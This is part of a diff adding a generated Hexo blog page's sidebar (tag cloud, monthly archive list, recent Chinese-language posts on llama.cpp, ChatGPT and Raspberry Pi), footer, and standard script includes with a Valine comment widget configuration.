href="/tags/%E9%9F%B3%E9%A2%91%E9%99%8D%E5%99%AA/" rel="tag">音频降噪</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AI/" style="font-size: 10px;">AI</a> <a href="/tags/C-dbx/" style="font-size: 10px;">C;dbx</a> <a href="/tags/ChatGPT/" style="font-size: 10px;">ChatGPT</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/LLaMA/" style="font-size: 10px;">LLaMA</a> <a href="/tags/MD5-CTX/" style="font-size: 10px;">MD5_CTX</a> <a href="/tags/alarm/" style="font-size: 10px;">alarm</a> <a href="/tags/backup/" style="font-size: 10px;">backup</a> <a href="/tags/fseek/" style="font-size: 10px;">fseek</a> <a href="/tags/ftell/" style="font-size: 10px;">ftell</a> <a href="/tags/gethostbyname/" style="font-size: 10px;">gethostbyname</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/jmp-buf/" style="font-size: 10px;">jmp_buf</a> <a href="/tags/k8s/" style="font-size: 10px;">k8s</a> <a href="/tags/linux%E5%BD%95%E9%9F%B3/" style="font-size: 10px;">linux录音</a> <a href="/tags/longjmp/" style="font-size: 10px;">longjmp</a> <a href="/tags/mimikatz/" style="font-size: 10px;">mimikatz</a> <a href="/tags/minikube/" style="font-size: 10px;">minikube</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/nginx-%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">nginx;脚本</a> <a href="/tags/openshift/" style="font-size: 10px;">openshift</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/paas/" style="font-size: 10px;">paas</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/qsort/" style="font-size: 10px;">qsort</a> <a href="/tags/setjmp/" style="font-size: 10px;">setjmp</a> <a href="/tags/xss-easyxss/" style="font-size: 10px;">xss;easyxss</a> <a href="/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/" style="font-size: 10px;">云计算</a> <a href="/tags/%E6%A0%91%E9%9C%89%E6%B4%BE/" style="font-size: 10px;">树霉派</a> <a href="/tags/%E9%9F%B3%E9%A2%91%E9%99%8D%E5%99%AA/" style="font-size: 10px;">音频降噪</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">February 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">April 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">September 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">August 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">March 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">January 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">November 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">October 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">September 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">August 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/05/">May 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/04/">April 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/03/">March 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/02/">February 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/01/">January 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/12/">December 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/11/">November 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/10/">October 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/09/">September 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/08/">August 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/07/">July 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/06/">June 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/05/">May 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/04/">April 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/03/">March 2010</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/05/05/%E4%BD%BF%E7%94%A8LLAMA%E3%80%81llama.cpp%E6%90%AD%E5%BB%BA%E7%B1%BBChatGPT%E7%8E%AF%E5%A2%83/">使用LLAMA、llama.cpp搭建类ChatGPT环境</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/24/%E5%9C%A8%E4%BD%BF%E7%94%A8ChatGPT%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%84%9F%E6%83%B3/">在使用ChatGPT中的一些感想</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/21/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E5%92%8C%E8%BE%93%E5%85%A5%E5%8D%A1%E9%A1%BF%EF%BC%8C%E8%AF%95%E4%BA%86%E5%BE%88%E5%A4%9A%E6%96%B9%E6%B3%95/">解决树莓派SSH登录和输入卡顿，试了很多方法</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/26/%E5%B7%B4%E8%8F%B2%E7%89%B9%E7%9A%84%E5%9F%BA%E7%A1%80%E6%8A%95%E8%B5%84%E7%90%86%E5%BF%B5%E8%AE%B0%E5%BD%95/">巴菲特的基础投资理念记录</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/26/Ubuntu-%E5%AE%89%E8%A3%85minikebe/">Ubuntu 安装minikebe</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+        <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备2023016529号</a>
+      
+      &copy; 2025 key1088<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>
+
+<script>
+    var GUEST_INFO = ['nick','mail','link'];
+    var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+        return GUEST_INFO.indexOf(item) > -1
+    });
+    var notify = 'false' == true;
+    var verify = 'false' == true;
+    new Valine({
+        el: '.vcomment',
+        notify: notify,
+        verify: verify,
+        appId: "G0tpuvaoHAtNY2tokxE4JdM8-gzGzoHsz",
+        appKey: "Mftb2MUOgwBc0nNzeiDK5OB4",
+        placeholder: "Just go go",
+        pageSize:'10',
+        avatar:'mm',
+        lang:'zh-cn'
+    });
+</script>
+
+  </div>
+</body>
+</html>
